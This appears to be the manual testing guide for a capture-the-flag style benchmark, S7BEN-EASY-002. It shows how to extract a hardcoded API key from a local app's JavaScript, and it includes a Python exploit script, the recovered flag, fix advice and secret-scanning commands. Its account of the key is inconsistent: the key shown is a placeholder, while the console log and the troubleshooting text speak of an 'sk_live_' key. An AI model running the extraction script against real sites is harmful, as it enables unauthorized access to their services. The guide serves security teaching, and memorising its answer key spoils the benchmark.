# S7BEN-EASY-002: Manual Testing Guide

## Vulnerability: Hardcoded Secrets - API Key Exposure

### Overview
This benchmark demonstrates a critical cryptographic failure where API keys are hardcoded in client-side JavaScript. Anyone who can view the source code can extract these secrets and use them to access protected endpoints.

---

## Setup

### 1. Build and Start the Benchmark
```bash
cd benchmarks/S7BEN-EASY-002
make build
make up
```

### 2. Verify Service is Running
```bash
make test
# Should output: Health check passed
```

### 3. Access the Application
Open your browser to: http://localhost:5000

---

## Manual Testing Steps

### Step 1: Explore the Application
Open http://localhost:5000 in your browser. You'll see a simple data portal with two buttons.

### Step 2: Test Public Endpoint (No Auth Required)
```bash
curl http://localhost:5000/api/public
```

**Expected Output:**
```json
{
  "data": {
    "posts": 5678,
    "users": 1234,
    "visitors": 91011
  },
  "message": "This is public data"
}
```

### Step 3: Try Protected Endpoint Without API Key
```bash
curl http://localhost:5000/api/secret
```

**Expected Output:**
```json
{
  "error": "Missing API key",
  "hint": "Send X-API-Key header with your request"
}
```

### Step 4: Try Protected Endpoint With Wrong API Key
```bash
curl http://localhost:5000/api/secret \
  -H "X-API-Key: wrong-key"
```

**Expected Output:**
```json
{
  "error": "Invalid API key",
  "hint": "The API key you provided is incorrect"
}
```

Now we need to find the real API key!

---

## Exploitation

### Method 1: Browser Developer Tools (Most Common)

1. Open http://localhost:5000 in your browser
2. Press F12 to open Developer Tools
3. Go to the "Sources" or "Debugger" tab
4. Navigate to: `localhost:5000` → `static` → `app.js`
5. Look for the API_KEY constant (around line 6)

You'll see:
```javascript
const API_KEY = "EXAMPLE_API_KEY_REPLACE_WITH_ACTUAL";
```

### Method 2: Direct Source Download
```bash
curl http://localhost:5000/static/app.js
```

**Output:**
```javascript
// Strike7 Data Portal - Client Application
// Version 1.0.0

// VULNERABILITY: API Key hardcoded in client-side JavaScript!
const API_KEY = "EXAMPLE_API_KEY_REPLACE_WITH_ACTUAL";
...
```

### Method 3: Browser Console
1. Open http://localhost:5000
2. Press F12 and go to "Console" tab
3. The application helpfully logs:
   ```
   Strike7 Data Portal initialized
   API Base URL: http://localhost:5000
   API Key loaded: sk_live_51...
   ```

### Method 4: View Page Source
1. Open http://localhost:5000
2. Right-click → "View Page Source"
3. Find the line: `<script src="/static/app.js"></script>`
4. Click the link to view app.js

### Method 5: Using grep (Automated)
```bash
# Download and search for API keys
curl -s http://localhost:5000/static/app.js | grep -i "api_key"
```

**Output:**
```javascript
const API_KEY = "EXAMPLE_API_KEY_REPLACE_WITH_ACTUAL";
```

---

## Getting the Flag

Once you've extracted the API key, use it to access the protected endpoint:

### Using curl:
```bash
curl http://localhost:5000/api/secret \
  -H "X-API-Key: EXAMPLE_API_KEY_REPLACE_WITH_ACTUAL"
```

**Expected Output:**
```json
{
  "flag": "S7BEN{H4RDC0D3D_S3CR3TS_4R3_B4D}",
  "message": "Access granted!",
  "secret_data": {
    "admin_users": ["admin", "root", "superuser"],
    "backup_location": "/var/backups/production",
    "database_host": "db.internal.strike7.com"
  }
}
```

### Using Python:
```python
import requests

API_KEY = "EXAMPLE_API_KEY_REPLACE_WITH_ACTUAL"
URL = "http://localhost:5000/api/secret"

response = requests.get(
    URL,
    headers={"X-API-Key": API_KEY}
)

data = response.json()
print(f"Flag: {data['flag']}")
```

### Using Browser:
1. Open http://localhost:5000
2. Click "Fetch Secret Data" button
3. The flag will be displayed on the page

---

## Automated Exploitation Script

Create `exploit.py`:
```python
import requests
import re

URL = "http://localhost:5000"

def find_api_key():
    """Extract API key from JavaScript source"""
    print("[*] Downloading JavaScript source...")

    response = requests.get(f"{URL}/static/app.js")

    if response.status_code != 200:
        print(f"[-] Failed to download JavaScript: {response.status_code}")
        return None

    js_content = response.text

    # Search for API key pattern
    pattern = r'const API_KEY = ["\']([^"\']+)["\']'
    match = re.search(pattern, js_content)

    if match:
        api_key = match.group(1)
        print(f"[+] Found API key: {api_key}")
        return api_key
    else:
        print("[-] Could not find API key in JavaScript")
        return None

def exploit(api_key):
    """Use the API key to access protected endpoint"""
    print(f"\n[*] Attempting to access protected endpoint...")

    response = requests.get(
        f"{URL}/api/secret",
        headers={"X-API-Key": api_key}
    )

    if response.status_code == 200:
        data = response.json()
        print(f"[+] Success! Access granted.")
        print(f"\n{'='*60}")
        print(f"FLAG: {data['flag']}")
        print(f"{'='*60}\n")
        print("Additional secret data:")
        print(f"  - Admin users: {', '.join(data['secret_data']['admin_users'])}")
        print(f"  - Database: {data['secret_data']['database_host']}")
        print(f"  - Backups: {data['secret_data']['backup_location']}")
        return True
    else:
        print(f"[-] Failed: {response.status_code}")
        print(f"    {response.json()}")
        return False

def main():
    print("="*60)
    print("S7BEN-EASY-002: Hardcoded Secrets Exploit")
    print("="*60)

    # Step 1: Find the API key
    api_key = find_api_key()

    if not api_key:
        print("\n[-] Exploitation failed: Could not find API key")
        return

    # Step 2: Use the API key
    exploit(api_key)

if __name__ == "__main__":
    main()
```

Run the exploit:
```bash
python3 exploit.py
```

**Expected Output:**
```
============================================================
S7BEN-EASY-002: Hardcoded Secrets Exploit
============================================================
[*] Downloading JavaScript source...
[+] Found API key: EXAMPLE_API_KEY_REPLACE_WITH_ACTUAL

[*] Attempting to access protected endpoint...
[+] Success! Access granted.

============================================================
FLAG: S7BEN{H4RDC0D3D_S3CR3TS_4R3_B4D}
============================================================

Additional secret data:
  - Admin users: admin, root, superuser
  - Database: db.internal.strike7.com
  - Backups: /var/backups/production
```

---

## Understanding the Vulnerability

### The Vulnerable Code (static/app.js:6)

```javascript
// VULNERABILITY: API Key hardcoded in client-side JavaScript!
const API_KEY = "EXAMPLE_API_KEY_REPLACE_WITH_ACTUAL";
```

### Why This is Critical

1. **Client-side code is public**: Anyone can view JavaScript files
2. **No obfuscation helps**: Even minified code can be deobfuscated
3. **Keys can't be revoked easily**: Once exposed, must rotate all keys
4. **Affects all users**: Every client has the same key

### Real-World Impact

- AWS keys in JavaScript → Full cloud account compromise
- Database credentials → Data breach
- API keys → Unauthorized access to services
- OAuth secrets → Account takeovers

### Proper Fix

**Never put secrets in client-side code!**

Instead:
```javascript
// Frontend: No API key needed
fetch('/api/secret')  // Server handles auth with session/JWT

// Backend: Server validates user session
@app.route('/api/secret')
def api_secret():
    if not current_user.is_authenticated:
        return "Unauthorized", 401

    # Server uses API key internally
    external_data = requests.get(
        "https://api.example.com/data",
        headers={"X-API-Key": os.environ['API_KEY']}
    )
```

---

## Common Places to Find Hardcoded Secrets

1. **JavaScript files**: Look for `.js` files in `/static`, `/assets`, `/js`
2. **HTML source**: Check `<script>` tags in HTML
3. **Environment files**: `.env` files accidentally committed
4. **Configuration files**: `config.js`, `settings.js`
5. **Mobile apps**: Decompiled APK/IPA files
6. **Git history**: Old commits that were "deleted"

### Tools for Finding Secrets

```bash
# Search for common secret patterns
grep -r "api_key\|apikey\|secret_key\|password" static/

# Use truffleHog for git history
trufflehog git file://. --json

# Use gitleaks
gitleaks detect --source .
```

---

## Troubleshooting

### Issue: Can't find the JavaScript file
**Solution:** Make sure you're accessing `/static/app.js`:
```bash
curl http://localhost:5000/static/app.js
```

### Issue: API key doesn't work
**Solution:** Make sure you're copying the entire key including the prefix `sk_live_`.

### Issue: Service not responding
```bash
# Check if service is running
docker compose ps

# Check logs
docker compose logs app

# Restart if needed
make down && make up
```

---

## Cleanup

```bash
make down
make clean
```

---

## Success Criteria

- Successfully found API key in JavaScript source
- Used API key to access protected endpoint
- Retrieved flag: `S7BEN{H4RDC0D3D_S3CR3TS_4R3_B4D}`
